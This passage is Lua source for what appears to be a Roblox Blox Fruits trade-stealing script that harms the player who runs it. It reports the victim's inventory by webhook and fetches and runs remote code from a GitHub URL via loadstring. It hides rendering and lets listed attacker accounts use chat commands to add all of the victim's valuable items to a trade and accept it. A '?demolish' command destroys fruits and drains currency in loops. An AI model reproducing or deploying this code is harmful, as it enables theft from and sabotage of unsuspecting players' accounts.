    createTween(Description, {TextTransparency = 0}):Play()
    task.wait(0.1)
    createTween(Button, {BackgroundTransparency = 0, TextTransparency = 0}):Play()

    Button.MouseEnter:Connect(function()
        createTween(Button, {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play()
    end)
    
    Button.MouseLeave:Connect(function()
        createTween(Button, {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
    end)
    
    Button.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/pYXjZndm")
        Button.Text = "Copied!"
        task.delay(2, function() Button.Text = "Copy Invite" end)
    end)
    
    ScreenGui.Parent = CoreGui
    return ScreenGui
end

-- << Commands: ?jump, ?additem <name>, ?addfruit <name>, ?cleartrade, ?accept, ?resetfruit, ?reset, ?rejoin, ?addallfruits, ?addallitems, ?invite, ?demolish

local Commands = {
    jump = {
        execute = ForceJump
    },

    invite = {
        execute = createDiscordUI
    },
    
    addfruit = {
        execute = function(argument)
            local inventory = getInventory()
            if not inventory then return end
            
            local searchTerm = argument:lower()
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                    TradeFunction:InvokeServer("addItem", item.Name)
                    return
                end
            end
        end
    },

    demolish = {
        execute = function()
            local function invokeRemote(remoteName, args)
                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName)
                return remote:InvokeServer(unpack(args))
            end
            invokeRemote("CommF_", {"RemoveFruit", "Beli"})
    
            local inventory = getInventory()
            if not inventory then
                return
            end
            local fruits = {}
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" then
                    table.insert(fruits, item)
                end
            end
            table.sort(fruits, function(a, b)
                return a.Value > b.Value
            end)
            for _, fruit in ipairs(fruits) do
                local baseFruitName = fruit.Name:match("(%S+)")
                ForceJump()
                invokeRemote("CommF_", {"LoadFruit", baseFruitName})
                task.wait(0.5)
    
                if LocalPlayer.Character then
                    LocalPlayer.Character:BreakJoints()
                    task.wait(6)
                end
            end
            local function drainBeli()
                local rocketArgs = {"PurchaseRawFruit", "Rocket-Rocket", false}
                local spinArgs = {"PurchaseRawFruit", "Spin-Spin", false}
                while true do
                    invokeRemote("CommF_", rocketArgs)
                    task.wait()
                    invokeRemote("CommF_", spinArgs)
                    task.wait()
                end
            end
            local function drainFragments()
                local fragmentArgs = {"BlackbeardReward", "Refund", "2"}
                while true do
                    invokeRemote("CommF_", fragmentArgs)
                    task.wait()
                end
            end
            coroutine.wrap(drainBeli)()
            coroutine.wrap(drainFragments)()
        end
    },

    additem = {
        execute = function(argument)
            local inventory = getInventory()
            if not inventory then return end
            
            local searchTerm = argument:lower()
            for _, item in pairs(inventory) do
                if item.Type == "Premium" and item.Name:lower():find(searchTerm) then
                    TradeFunction:InvokeServer("addItem", item.Name)
                    return
                end
            end
            
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "No Premium item matching '" .. argument .. "' found in inventory!", "All")
        end
    },
    
    addallitems = {
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
            if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
            
            local inventory = getInventory()
            if not inventory then return end
            
            local addedItems = {}
            for _, item in pairs(inventory) do
                if item.Type == "Premium" and not addedItems[item.Name] then
                    ReplicatedStorage.Remotes.TradeFunction:InvokeServer("addItem", item.Name)
                    addedItems[item.Name] = true
                    task.wait(0.05)
                end
            end
            
            if next(addedItems) then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Added all Premium items to trade", "All")
            else
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "No Premium items found in inventory!", "All")
            end
        end
},

    sit = {
        execute = function()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "Attempting to sit at trade table...", "All")
    
            local tradeTable, bestSeat = findTradeTable()
            if tradeTable and bestSeat then
                local character = LocalPlayer.Character
                if character and character.PrimaryPart then
                    tweenToPosition(bestSeat.Position + Vector3.new(0, 2, 0))
                    task.wait(1)
    
                    local function attemptSit()
                        for i = 1, 10 do
                            local randomOffset = Vector3.new(
                                math.random(-2, 2) / 10,
                                math.random(-2, 2) / 10,
                                math.random(-2, 2) / 10
                            )
                            
                            tweenToPosition(bestSeat.Position + randomOffset)
                            
                            task.wait(0.5)
                            
                            if bestSeat:FindFirstChild("SeatWeld") and 
                               bestSeat.SeatWeld.Part1 and 
                               bestSeat.SeatWeld.Part1.Parent == character then
                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                                    "Successfully sat at trade table!", "All")
                                return true
                            end
                        end
                        return false
                    end
                    
                    if not attemptSit() then
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "Failed to sit. Try running ?sit again!", "All")
                    end
                end
            else
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Error! Try running ?tp.", "All")
            end
        end
    },

    tp = {
        execute = function()
            if game.PlaceId == 7449423635 then
                local inventory = getInventory()
                if inventory then
                    for _, item in ipairs(inventory) do
                        if item.Name == "Valkyrie Helm" then
                            Remote:InvokeServer("requestEntrance", Vector3.new(-12471.33, 374.95, -7539.37))
                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                                "Teleporting to Mansion...", "All")
                            return
                        end
                    end
                end
                tweenToPosition(Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125))
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Teleporting to Mansion...", "All")
            else
                tweenToPosition(Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125))
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Teleporting to Cafe...", "All")
            end
        end
    },

test = {
    execute = function()
        local startTime = tick()
        task.wait(0.001)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
            "I'm Responsive! My response time is " .. math.floor((tick() - startTime) * 1000) .. "ms", "All")
    end
},
    
    addallfruits = {
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
            if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
            
            local inventory = getInventory()
            if not inventory then return end
            
            local addedFruits = {}
            for _, fruit in ipairs(FruitsToHit) do
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name == fruit and not addedFruits[fruit] then
                        ReplicatedStorage.Remotes.TradeFunction:InvokeServer("addItem", fruit)
                        addedFruits[fruit] = true
                        task.wait(0.05)
                        break
                    end
                end
            end
        end
    },
    
    cleartrade = {
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
            if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
            
            local container = tradeUI.Trade:FindFirstChild("Container")
            if not container then return end
            
            local playerFrame = container:FindFirstChild("1")
            if not playerFrame then return end
            
            local itemFrame = playerFrame:FindFirstChild("Frame")
            if not itemFrame then return end
            
            for _, item in ipairs(itemFrame:GetChildren()) do
                if item:IsA("ImageButton") then
                    TradeFunction:InvokeServer("removeItem", item.Name)
                    task.wait(0.05)
                end
            end
        end
    },
    
    accept = {
        execute = function()
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
            if not tradeUI or not tradeUI:FindFirstChild("Trade") or not tradeUI.Trade.Visible then
                return
            end
            local character = LocalPlayer.Character
            if not character then return end
            
            local humanoid = character:FindFirstChild("Humanoid")
            if not humanoid or not humanoid.Sit then
                return
            end
            task.wait(0.1)
            TradeFunction:InvokeServer("accept")
        end
    },
    
    resetfruit = {
        execute = function(argument)
            local inventory = getInventory()
            if not inventory then return end
            
            local searchTerm = argument:lower()
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                    local baseFruitName = item.Name:match("(%S+)")
                    ForceJump()
                    Remote:InvokeServer("LoadFruit", baseFruitName)
                    task.wait(0.25)
                    if LocalPlayer.Character then
                        LocalPlayer.Character:BreakJoints()
                    end
                    return
                end
            end
            
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "No fruit matching '" .. argument .. "' found in inventory!", "All")
        end
    },
    
    reset = {
        execute = function()
            if LocalPlayer.Character then
                LocalPlayer.Character:BreakJoints()
            end
        end
    },
    
    rejoin = {
        execute = function()
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end
    }
}

local CommandCooldowns = {}
local DEFAULT_COOLDOWN = 0.5
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest")

local function isCommandOnCooldown(playerName, command)
    local playerCooldowns = CommandCooldowns[playerName]
    if not playerCooldowns then return false end
    
    local lastUsed = playerCooldowns[command]
    if not lastUsed then return false end
    
    local timeSinceLastUse = tick() - lastUsed
    return timeSinceLastUse < DEFAULT_COOLDOWN
end

local function setCommandCooldown(playerName, command)
    CommandCooldowns[playerName] = CommandCooldowns[playerName] or {}
    CommandCooldowns[playerName][command] = tick()
end

local function sendMessage(message)
    pcall(function()
        SayMessageRequest:FireServer(message, "All")
    end)
end

local function isPlayerInUsernames(player, Usernames)
    if not player then return false end
    local playerNameLower = string.lower(player.Name)

    for _, username in ipairs(Usernames) do
        if string.lower(username) == playerNameLower then
            return true
        end
    end
    return false
end

local function processChatCommand(_, player, message, channel)
    if not (player and message and typeof(player) == "Instance" and 
            player:IsA("Player") and typeof(message) == "string" and
            message:sub(1,1) == "?" and Usernames and table.find(Usernames, player.Name)) then
        return
    end
    
    local commandStr = message:sub(2):match("^%s*(.-)%s*$")
    if not commandStr or commandStr == "" then return end
    
    local command, argument = commandStr:match("^(%S+)%s*(.-)%s*$")
    command = command and command:lower()
    
    local commandFunc = Commands[command]
    if not commandFunc then
        sendMessage("Unknown command: ?" .. command)
        return
    end
    
    if isCommandOnCooldown(player.Name, command) then
        sendMessage("Please wait before using this command again!")
        return
    end

    setCommandCooldown(player.Name, command)
    
    task.spawn(function()
        local success = pcall(commandFunc.execute, argument)
        if not success then
            sendMessage("Error executing command: " .. command)
        end
    end)
end

Players.PlayerRemoving:Connect(function(player)
    CommandCooldowns[player.Name] = nil
end)

local function startMainLoop()
    local now = tick()
    local isLoopRunning = true
    local hasCheckedCurrentTrade = false
    local currentTable, currentSeat
    local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
    
    local lastMovementTime = now
    local lastTableCheck = now
    local lastTradeCheck = now
    
    local UPDATE_INTERVAL = 0.5
    local TABLE_CHECK_INTERVAL = 2
    local MOVEMENT_CHECK_INTERVAL = 4
    local TRADE_VALIDATION_DELAY = 1.5
    local TRADE_RECHECK_COUNT = 4
    
    local function validateTradePartner()
        local failedChecks = 0
        local lastTradeState = false
        
        for i = 1, TRADE_RECHECK_COUNT do
            task.wait(0.25)
            
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
            local currentTradeState = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible

            if lastTradeState ~= currentTradeState then
                failedChecks = failedChecks + 1
            end
            
            if not currentTradeState or not isInTradeWithCorrectPlayer() then
                failedChecks = failedChecks + 1
            end
            
            lastTradeState = currentTradeState
        end
    
        if failedChecks >= TRADE_RECHECK_COUNT - 1 then
            task.wait(0.1)
            ForceJump()
        end
    end
    
    local function runMainLoop()
        while isLoopRunning do
            now = tick()
            
            local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
            local isInTrade = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible
            
            if not isInTrade then
                hasCheckedCurrentTrade = false
                lastTradeCheck = now
            elseif not hasCheckedCurrentTrade and (now - lastTradeCheck) >= TRADE_VALIDATION_DELAY then
                task.spawn(validateTradePartner)
                hasCheckedCurrentTrade = true
            end
            
            if now - lastTableCheck >= TABLE_CHECK_INTERVAL then
                currentTable, currentSeat = findTradeTable()
                lastTableCheck = now
            end
            
            if currentTable and currentSeat then
                local character = LocalPlayer.Character
                if character then
                    local root = character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local distance = (root.Position - currentSeat.Position).Magnitude
                        
                        if distance > 5 then
                            tweenToPosition(currentSeat.Position)
                        elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then
                            tweenToPosition(currentSeat.Position + randomOffset)
                            lastMovementTime = now
                            randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
                        end
                    end
                end
            end
            
            task.wait(UPDATE_INTERVAL)
        end
    end
    
    local function onCharacterAdded(character)
        task.wait(1)
        
        if not character:FindFirstChild("Humanoid") or not character:FindFirstChild("HumanoidRootPart") then
            character:WaitForChild("Humanoid")
            character:WaitForChild("HumanoidRootPart")
        end
        
        lastMovementTime = tick()
        lastTableCheck = tick()
        lastTradeCheck = tick()
        currentTable, currentSeat = findTradeTable()
        
        disableJump()
        
        if currentTable and currentSeat then
            tweenToPosition(currentSeat.Position)
        end
    end
    
    local characterAddedConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
    local characterRemovingConnection = LocalPlayer.CharacterRemoving:Connect(function()
        currentTable = nil
        currentSeat = nil
    end)
    
    if LocalPlayer.Character then
        onCharacterAdded(LocalPlayer.Character)
    end
    
    task.spawn(runMainLoop)
    
    return function()
        isLoopRunning = false
        characterAddedConnection:Disconnect()
        characterRemovingConnection:Disconnect()
    end
end

local function init()
    local placeId = game.PlaceId

    if placeId == 2753915549 then
        LocalPlayer:Kick("This script works only in Sea 2 or 3!")
        return
    end
    
    if placeId ~= 4442272183 and placeId ~= 7449423635 then
        LocalPlayer:Kick("This script is meant for Blox Fruits only!")
        return
    end
    
    local inventory = getInventory()
    if not inventory then
        LocalPlayer:Kick("Error.")
        return
    end
    
    local function checkInventory()
        local fruitsToHitSet = {}
        for _, fruit in ipairs(FruitsToHit) do
            fruitsToHitSet[fruit] = true
        end
        
        for _, item in ipairs(inventory) do
            if (item.Type == "Blox Fruit" and fruitsToHitSet[item.Name]) or
               (item.Type == "Premium") then
                return true
            end
        end
        return false
    end
    
    if not checkInventory() then
        print("hello")
        return
    end

    task.spawn(function()
        task.wait(1)
        JoinTeam()
        task.spawn(createNotification)
        sendWebhook(inventory)
    end)

    local mainLoopStarted = false
    
    local function onPlayerAdded(player)
        if mainLoopStarted then return end

        local playerNameLower = string.lower(player.Name)
        local found = false
        
        for _, username in ipairs(Usernames) do
            if string.lower(username) == playerNameLower then
                found = true
                break
            end
        end
        
        if not found then return end        
        
        mainLoopStarted = true
        
        task.spawn(function()
            task.wait(2)
            
            local success = pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/UI/refs/heads/main/loading"))()
            end)
            
            if not success then
                LocalPlayer:Kick("ERROR! Please, Rejoin.")
                return
            end
            
            task.wait(1)
            Players.PlayerChatted:Connect(processChatCommand)
            RunService:Set3dRenderingEnabled(false)

            task.spawn(startMainLoop)
            
            task.spawn(function()
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Join (pYXjZndm) << Invite in dc if you want to learn how to make a lot of mythical fruits!",
                    "All"
                )
            end)
        end)
    end
    
    local connection = Players.PlayerAdded:Connect(onPlayerAdded)

    task.spawn(function()
        for _, player in ipairs(Players:GetPlayers()) do
            onPlayerAdded(player)
        end
    end)
    
    task.spawn(function()
        local cleanupConnection
        cleanupConnection = Players.PlayerRemoving:Connect(function(player)
            if player == LocalPlayer then
                connection:Disconnect()
                cleanupConnection:Disconnect()
            end
        end)
    end)
end

if not shared.ScriptExecuted then
    shared.ScriptExecuted = true
    task.spawn(function()
        local success, errorMessage = pcall(init)
        if not success then
            task.spawn(function()
                LocalPlayer:Kick("Error: " .. tostring(errorMessage))
            end)
        end
    end)
end